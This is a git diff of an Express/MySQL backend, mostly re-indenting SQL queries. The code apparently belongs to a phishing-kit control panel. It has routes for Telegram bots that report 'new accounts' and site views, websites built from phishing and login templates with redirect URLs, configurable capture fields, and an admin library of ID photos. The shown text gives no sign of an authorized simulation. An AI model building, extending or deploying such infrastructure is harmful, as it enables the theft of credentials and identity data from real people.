+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+  `, [
       name, description, thumbnail, type, content_html, content_css, content_js,
       1, is_shared ? 1 : 0, approvalStatus, submittedForApprovalAt, createdBy
     ]);
@@ -6376,9 +5260,9 @@ app.post('/api/templates/create', authenticateUser, strictRateLimiter(), async (
         const ipAddress = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.ip;
         const userAgent = req.headers['user-agent'] || '';
         await executeQuery(`
-          INSERT INTO activities (user_id, username, type, action, description, metadata, ip_address, user_agent)
-          VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-        `, [
+        INSERT INTO activities (user_id, username, type, action, description, metadata, ip_address, user_agent)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+      `, [
           createdBy,
           req.user.username,
           'template_created',
@@ -6456,11 +5340,11 @@ app.put('/api/templates/update/:id', authenticateUser, strictRateLimiter(), asyn
     }
 
     const result = await executeQuery(`
-      UPDATE templates 
-      SET name = ?, description = ?, thumbnail = ?, type = ?, content_html = ?, content_css = ?, content_js = ?, 
-          is_shared = ?, approval_status = ?, submitted_for_approval_at = ?
-      WHERE id = ? AND created_by = ?
-    `, [
+    UPDATE templates 
+    SET name = ?, description = ?, thumbnail = ?, type = ?, content_html = ?, content_css = ?, content_js = ?, 
+        is_shared = ?, approval_status = ?, submitted_for_approval_at = ?
+    WHERE id = ? AND created_by = ?
+  `, [
       name, description, thumbnail, type, content_html, content_css, content_js,
       is_shared ? 1 : 0, approvalStatus, submittedForApprovalAt, id, userId
     ]);
@@ -6544,13 +5428,13 @@ app.get('/api/admin/templates/pending', authenticateUser, async (req, res) => {
     }
 
     const result = await executeQuery(`
-      SELECT t.*, u.username as created_by_name
-      FROM templates t
-      LEFT JOIN users u ON t.created_by = u.id
-      WHERE t.approval_status = 'pending'
-        AND t.is_shared = 1
-      ORDER BY t.submitted_for_approval_at ASC
-    `);
+    SELECT t.*, u.username as created_by_name
+    FROM templates t
+    LEFT JOIN users u ON t.created_by = u.id
+    WHERE t.approval_status = 'pending'
+      AND t.is_shared = 1
+    ORDER BY t.submitted_for_approval_at ASC
+  `);
 
     if (result.success) {
       res.json({
@@ -6586,10 +5470,10 @@ app.post('/api/admin/templates/approve/:id', authenticateUser, async (req, res) 
     const adminId = req.user.id;
 
     const result = await executeQuery(`
-      UPDATE templates 
-      SET approval_status = 'approved', approved_by = ?, approved_at = NOW()
-      WHERE id = ? AND approval_status = 'pending'
-    `, [adminId, id]);
+    UPDATE templates 
+    SET approval_status = 'approved', approved_by = ?, approved_at = NOW()
+    WHERE id = ? AND approval_status = 'pending'
+  `, [adminId, id]);
 
     if (result.success && result.data.affectedRows > 0) {
       res.json({
@@ -6633,10 +5517,10 @@ app.post('/api/admin/templates/reject/:id', authenticateUser, async (req, res) =
     }
 
     const result = await executeQuery(`
-      UPDATE templates 
-      SET approval_status = 'rejected', approved_by = ?, approved_at = NOW(), rejection_reason = ?
-      WHERE id = ? AND approval_status = 'pending'
-    `, [adminId, reason, id]);
+    UPDATE templates 
+    SET approval_status = 'rejected', approved_by = ?, approved_at = NOW(), rejection_reason = ?
+    WHERE id = ? AND approval_status = 'pending'
+  `, [adminId, reason, id]);
 
     if (result.success && result.data.affectedRows > 0) {
       res.json({
@@ -6666,21 +5550,21 @@ app.get('/api/domains', authenticateUser, async (req, res) => {
     const userId = req.user.id;
 
     const result = await executeQuery(`
-      SELECT DISTINCT d.id, d.domain_name, d.description, d.is_active
-      FROM domains d
-      WHERE d.is_active = 1 
-        AND (
-          d.access_type = 'public' 
-          OR (
-            d.access_type = 'private' 
-            AND EXISTS (
-              SELECT 1 FROM domain_users du 
-              WHERE du.domain_id = d.id AND du.user_id = ?
-            )
+    SELECT DISTINCT d.id, d.domain_name, d.description, d.is_active
+    FROM domains d
+    WHERE d.is_active = 1 
+      AND (
+        d.access_type = 'public' 
+        OR (
+          d.access_type = 'private' 
+          AND EXISTS (
+            SELECT 1 FROM domain_users du 
+            WHERE du.domain_id = d.id AND du.user_id = ?
           )
         )
-      ORDER BY d.domain_name ASC
-    `, [userId]);
+      )
+    ORDER BY d.domain_name ASC
+  `, [userId]);
 
     if (result.success) {
       res.json({
@@ -6712,18 +5596,18 @@ app.get('/api/admin/domains', authenticateUser, async (req, res) => {
     }
 
     const result = await executeQuery(`
-      SELECT d.*, u.username as created_by_name,
-             GROUP_CONCAT(
-               CONCAT(du_user.username, '|', du_user.email) 
-               SEPARATOR '||'
-             ) as allowed_users_data
-      FROM domains d
-      LEFT JOIN users u ON d.created_by = u.id
-      LEFT JOIN domain_users du ON d.id = du.domain_id AND d.access_type = 'private'
-      LEFT JOIN users du_user ON du.user_id = du_user.id
-      GROUP BY d.id
-      ORDER BY d.created_at DESC
-    `);
+    SELECT d.*, u.username as created_by_name,
+           GROUP_CONCAT(
+             CONCAT(du_user.username, '|', du_user.email) 
+             SEPARATOR '||'
+           ) as allowed_users_data
+    FROM domains d
+    LEFT JOIN users u ON d.created_by = u.id
+    LEFT JOIN domain_users du ON d.id = du.domain_id AND d.access_type = 'private'
+    LEFT JOIN users du_user ON du.user_id = du_user.id
+    GROUP BY d.id
+    ORDER BY d.created_at DESC
+  `);
 
     if (result.success) {
       // Process allowed users data
@@ -6800,9 +5684,9 @@ app.post('/api/admin/domains', authenticateUser, async (req, res) => {
     }
 
     const result = await executeQuery(`
-      INSERT INTO domains (domain_name, description, access_type, is_active, created_by)
-      VALUES (?, ?, ?, ?, ?)
-    `, [domain_name, description, access_type, is_active, createdBy]);
+    INSERT INTO domains (domain_name, description, access_type, is_active, created_by)
+    VALUES (?, ?, ?, ?, ?)
+  `, [domain_name, description, access_type, is_active, createdBy]);
 
     if (result.success) {
       const domainId = result.data.insertId;
@@ -6811,9 +5695,9 @@ app.post('/api/admin/domains', authenticateUser, async (req, res) => {
       if (access_type === 'private' && allowed_users.length > 0) {
         for (const userId of allowed_users) {
           await executeQuery(`
-            INSERT INTO domain_users (domain_id, user_id, granted_by)
-            VALUES (?, ?, ?)
-          `, [domainId, userId, createdBy]);
+          INSERT INTO domain_users (domain_id, user_id, granted_by)
+          VALUES (?, ?, ?)
+        `, [domainId, userId, createdBy]);
         }
       }
 
@@ -6878,10 +5762,10 @@ app.put('/api/admin/domains/:id', authenticateUser, async (req, res) => {
     }
 
     const result = await executeQuery(`
-      UPDATE domains 
-      SET domain_name = ?, description = ?, access_type = ?, is_active = ?
-      WHERE id = ?
-    `, [domain_name, description, access_type, is_active, id]);
+    UPDATE domains 
+    SET domain_name = ?, description = ?, access_type = ?, is_active = ?
+    WHERE id = ?
+  `, [domain_name, description, access_type, is_active, id]);
 
     if (result.success) {
       // Update allowed users for private domains
@@ -6893,9 +5777,9 @@ app.put('/api/admin/domains/:id', authenticateUser, async (req, res) => {
         if (allowed_users.length > 0) {
           for (const userId of allowed_users) {
             await executeQuery(`
-              INSERT INTO domain_users (domain_id, user_id, granted_by)
-              VALUES (?, ?, ?)
-            `, [id, userId, req.user.id]);
+            INSERT INTO domain_users (domain_id, user_id, granted_by)
+            VALUES (?, ?, ?)
+          `, [id, userId, req.user.id]);
           }
         }
       } else {
@@ -6989,9 +5873,9 @@ app.post('/api/admin/domains/users', authenticateUser, async (req, res) => {
     }
 
     const result = await executeQuery(`
-      INSERT INTO domain_users (domain_id, user_id, granted_by)
-      VALUES (?, ?, ?)
-    `, [domain_id, user_id, grantedBy]);
+    INSERT INTO domain_users (domain_id, user_id, granted_by)
+    VALUES (?, ?, ?)
+  `, [domain_id, user_id, grantedBy]);
 
     if (result.success) {
       res.json({
@@ -7130,15 +6014,15 @@ app.get('/api/phishing/telegram/bots', authenticateUser, async (req, res) => {
     const userId = req.user.id;
 
     const query = `
-      SELECT id, bot_name, bot_token, chat_id, bot_username, 
-             is_enabled, is_verified, webhook_url, webhook_set_at,
-             notify_new_accounts, notify_website_views, notify_errors,
-             messages_sent, last_message_at, last_error, last_error_at,
-             created_at, updated_at
-      FROM telegram_bots 
-      WHERE user_id = ?
-      ORDER BY created_at DESC
-    `;
+    SELECT id, bot_name, bot_token, chat_id, bot_username, 
+           is_enabled, is_verified, webhook_url, webhook_set_at,
+           notify_new_accounts, notify_website_views, notify_errors,
+           messages_sent, last_message_at, last_error, last_error_at,
+           created_at, updated_at
+    FROM telegram_bots 
+    WHERE user_id = ?
+    ORDER BY created_at DESC
+  `;
 
     const result = await executeQuery(query, [userId]);
 
@@ -7264,12 +6148,12 @@ app.post('/api/phishing/telegram/bots', authenticateUser, async (req, res) => {
 
     // STEP 4: Insert into database (only after successful verification)
     const query = `
-      INSERT INTO telegram_bots (
-        user_id, bot_name, bot_token, chat_id, bot_username,
-        is_verified, is_enabled, webhook_url, webhook_set_at,
-        notify_new_accounts, notify_website_views, notify_errors
-      ) VALUES (?, ?, ?, ?, ?, TRUE, TRUE, ?, NOW(), ?, ?, ?)
-    `;
+    INSERT INTO telegram_bots (
+      user_id, bot_name, bot_token, chat_id, bot_username,
+      is_verified, is_enabled, webhook_url, webhook_set_at,
+      notify_new_accounts, notify_website_views, notify_errors
+    ) VALUES (?, ?, ?, ?, ?, TRUE, TRUE, ?, NOW(), ?, ?, ?)
+  `;
 
     const result = await executeQuery(query, [
       userId, bot_name, bot_token, chat_id, botUsername,
@@ -7305,11 +6189,11 @@ app.put('/api/phishing/telegram/bots/:id', authenticateUser, async (req, res) =>
     const { bot_name, bot_token, chat_id, notify_new_accounts, notify_website_views, notify_errors } = req.body;
 
     const query = `
-      UPDATE telegram_bots 
-      SET bot_name = ?, bot_token = ?, chat_id = ?,
-          notify_new_accounts = ?, notify_website_views = ?, notify_errors = ?
-      WHERE id = ? AND user_id = ?
-    `;
+    UPDATE telegram_bots 
+    SET bot_name = ?, bot_token = ?, chat_id = ?,
+        notify_new_accounts = ?, notify_website_views = ?, notify_errors = ?
+    WHERE id = ? AND user_id = ?
+  `;
 
     const result = await executeQuery(query, [
       bot_name, bot_token, chat_id,
@@ -7345,10 +6229,10 @@ app.patch('/api/phishing/telegram/bots/:id/toggle', authenticateUser, async (req
     const { is_enabled } = req.body;
 
     const query = `
-      UPDATE telegram_bots 
-      SET is_enabled = ?
-      WHERE id = ? AND user_id = ?
-    `;
+    UPDATE telegram_bots 
+    SET is_enabled = ?
+    WHERE id = ? AND user_id = ?
+  `;
 
     const result = await executeQuery(query, [is_enabled, botId, userId]);
 
@@ -7449,13 +6333,13 @@ app.post('/api/phishing/telegram/bots/:id/verify', authenticateUser, async (req,
 
     // Step 4: Update database
     const updateQuery = `
-      UPDATE telegram_bots 
-      SET is_verified = TRUE, 
-          bot_username = ?,
-          webhook_url = ?,
-          webhook_set_at = NOW()
-      WHERE id = ? AND user_id = ?
-    `;
+    UPDATE telegram_bots 
+    SET is_verified = TRUE, 
+        bot_username = ?,
+        webhook_url = ?,
+        webhook_set_at = NOW()
+    WHERE id = ? AND user_id = ?
+  `;
 
     await executeQuery(updateQuery, [botUsername, webhookUrl, botId, userId]);
 
@@ -7509,13 +6393,13 @@ app.get('/api/user/login-history', authenticateToken, async (req, res) => {
     const userId = req.user.id;
 
     const query = `
-      SELECT id, ip_address, user_agent, device_type, browser, os, location,
-             is_active, created_at, logged_out_at
-      FROM login_history
-      WHERE user_id = ?
-      ORDER BY created_at DESC
-      LIMIT 50
-    `;
+    SELECT id, ip_address, user_agent, device_type, browser, os, location,
+           is_active, created_at, logged_out_at
+    FROM login_history
+    WHERE user_id = ?
+    ORDER BY created_at DESC
+    LIMIT 50
+  `;
 
     const result = await executeQuery(query, [userId]);
 
@@ -7617,20 +6501,20 @@ app.post('/api/user/blacklist-ip', authenticateToken, async (req, res) => {
 
     // Add IP to blacklist
     const query = `
-      INSERT INTO ip_blacklist (user_id, ip_address, created_by, reason)
-      VALUES (?, ?, ?, 'Blocked by user')
-      ON DUPLICATE KEY UPDATE created_at = CURRENT_TIMESTAMP
-    `;
+    INSERT INTO ip_blacklist (user_id, ip_address, created_by, reason)
+    VALUES (?, ?, ?, 'Blocked by user')
+    ON DUPLICATE KEY UPDATE created_at = CURRENT_TIMESTAMP
+  `;
 
     const blacklistResult = await executeQuery(query, [userId, ip_address, userId]);
     console.log(`🚫 Blacklist query result:`, blacklistResult);
 
     // Automatically logout all sessions from this IP
     const logoutQuery = `
-      UPDATE login_history
-      SET is_active = 0, logged_out_at = CURRENT_TIMESTAMP
-      WHERE user_id = ? AND ip_address = ? AND is_active = 1
-    `;
+    UPDATE login_history
+    SET is_active = 0, logged_out_at = CURRENT_TIMESTAMP
+    WHERE user_id = ? AND ip_address = ? AND is_active = 1
+  `;
 
     console.log(`🚫 Running logout query for user ${userId}, IP ${ip_address}`);
     const logoutResult = await executeQuery(logoutQuery, [userId, ip_address]);
@@ -7661,9 +6545,9 @@ app.delete('/api/user/blacklist-ip/:ipAddress', authenticateToken, async (req, r
     console.log(`🔓 Attempting to unblock IP ${ipAddress} for user ${userId}`);
 
     const query = `
-      DELETE FROM ip_blacklist
-      WHERE user_id = ? AND ip_address = ?
-    `;
+    DELETE FROM ip_blacklist
+    WHERE user_id = ? AND ip_address = ?
+  `;
 
     const result = await executeQuery(query, [userId, ipAddress]);
 
@@ -7695,9 +6579,9 @@ app.delete('/api/user/login-history/:sessionId', authenticateToken, async (req, 
     const sessionId = req.params.sessionId;
 
     const query = `
-      DELETE FROM login_history
-      WHERE id = ? AND user_id = ?
-    `;
+    DELETE FROM login_history
+    WHERE id = ? AND user_id = ?
+  `;
 
     const result = await executeQuery(query, [sessionId, userId]);
 
@@ -7801,10 +6685,10 @@ app.get('/api/admin/id-photos', authenticateUser, async (req, res) => {
     const { gender } = req.query;
 
     let query = `
-      SELECT p.*, u.username as uploader
-      FROM id_photos p
-      LEFT JOIN users u ON p.uploaded_by = u.id
-    `;
+    SELECT p.*, u.username as uploader
+    FROM id_photos p
+    LEFT JOIN users u ON p.uploaded_by = u.id
+  `;
     const params = [];
 
     if (gender && gender !== 'all') {
@@ -7849,9 +6733,9 @@ app.post('/api/admin/id-photos/upload', authenticateUser, idPhotosUpload.array('
       const fileUrl = `${req.protocol}://${req.get('host')}/${filePath}`;
 
       const query = `
-        INSERT INTO id_photos (filename, file_path, file_url, gender, file_size, mime_type, uploaded_by)
-        VALUES (?, ?, ?, ?, ?, ?, ?)
-      `;
+      INSERT INTO id_photos (filename, file_path, file_url, gender, file_size, mime_type, uploaded_by)
+      VALUES (?, ?, ?, ?, ?, ?, ?)
+    `;
 
       const result = await executeQuery(query, [
         file.filename,
@@ -7943,7 +6827,7 @@ app.post('/api/template-images/upload', authenticateToken, templateImageUpload.s
     // Save to database
     const result = await executeQuery(
       `INSERT INTO template_images (user_id, filename, original_name, file_path, file_size, mime_type) 
-       VALUES (?, ?, ?, ?, ?, ?)`,
+     VALUES (?, ?, ?, ?, ?, ?)`,
       [
         userId,
         req.file.filename,
@@ -7996,20 +6880,20 @@ app.get('/api/template-images', authenticateToken, async (req, res) => {
 
     // Create table if not exists
     await executeQuery(`
-      CREATE TABLE IF NOT EXISTS template_images (
-        id INT AUTO_INCREMENT PRIMARY KEY,
-        user_id INT NOT NULL,
-        filename VARCHAR(255) NOT NULL,
-        original_name VARCHAR(255) NOT NULL,
-        file_path VARCHAR(500) NOT NULL,
-        file_size BIGINT NOT NULL,
-        mime_type VARCHAR(100) NOT NULL,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
-        INDEX idx_user_id (user_id),
-        INDEX idx_created_at (created_at)
-      )
-    `);
+    CREATE TABLE IF NOT EXISTS template_images (
+      id INT AUTO_INCREMENT PRIMARY KEY,
+      user_id INT NOT NULL,
+      filename VARCHAR(255) NOT NULL,
+      original_name VARCHAR(255) NOT NULL,
+      file_path VARCHAR(500) NOT NULL,
+      file_size BIGINT NOT NULL,
+      mime_type VARCHAR(100) NOT NULL,
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+      INDEX idx_user_id (user_id),
+      INDEX idx_created_at (created_at)
+    )
+  `);
 
     // Get images for current user
     const result = await executeQuery(
@@ -8263,16 +7147,16 @@ app.post('/api/test/create-website', async (req, res) => {
     try {
       console.log('🔄 Trying new schema...');
       result = await executeQuery(`
-        INSERT INTO websites (title, description, slug, redirect_url, temp1, temp2, phishing_template_id, login_template_id, thumbnail, language, domain, user_id)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-      `, [title, description, slug, redirect_url, temp1, temp2, null, null, thumbnail, language, domain, userId]);
+      INSERT INTO websites (title, description, slug, redirect_url, temp1, temp2, phishing_template_id, login_template_id, thumbnail, language, domain, user_id)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `, [title, description, slug, redirect_url, temp1, temp2, null, null, thumbnail, language, domain, userId]);
       console.log('✅ New schema worked:', result);
     } catch (error) {
       console.log('⚠️  New schema failed, trying legacy:', error.message);
       result = await executeQuery(`
-        INSERT INTO websites (title, description, slug, redirect_url, temp1, temp2, thumbnail, language, domain, user_id)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-      `, [title, description, slug, redirect_url, temp1, temp2, thumbnail, language, domain, userId]);
+      INSERT INTO websites (title, description, slug, redirect_url, temp1, temp2, thumbnail, language, domain, user_id)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `, [title, description, slug, redirect_url, temp1, temp2, thumbnail, language, domain, userId]);
       console.log('🔄 Legacy schema result:', result);
     }
 
@@ -8437,10 +7321,10 @@ app.get('/api/template-fields/:websiteId', async (req, res) => {
 
     // Get website info to find template ID
     const websiteQuery = `
-      SELECT id, title, phishing_template_id, login_template_id 
-      FROM websites 
-      WHERE id = ?
-    `;
+    SELECT id, title, phishing_template_id, login_template_id 
+    FROM websites 
+    WHERE id = ?
+  `;
 
     const websiteResult = await executeQuery(websiteQuery, [websiteId]);
 
@@ -8489,11 +7373,11 @@ app.get('/api/template-fields/:websiteId', async (req, res) => {
 
     // Get template fields from database
     const fieldsQuery = `
-      SELECT id, field_name, field_type, is_required, field_placeholder, max_length, field_order
-      FROM template_fields 
-      WHERE template_id = ? 
-      ORDER BY field_order ASC
-    `;
+    SELECT id, field_name, field_type, is_required, field_placeholder, max_length, field_order
+    FROM template_fields 
+    WHERE template_id = ? 
+    ORDER BY field_order ASC
+  `;
 
     const fieldsResult = await executeQuery(fieldsQuery, [templateId]);
 
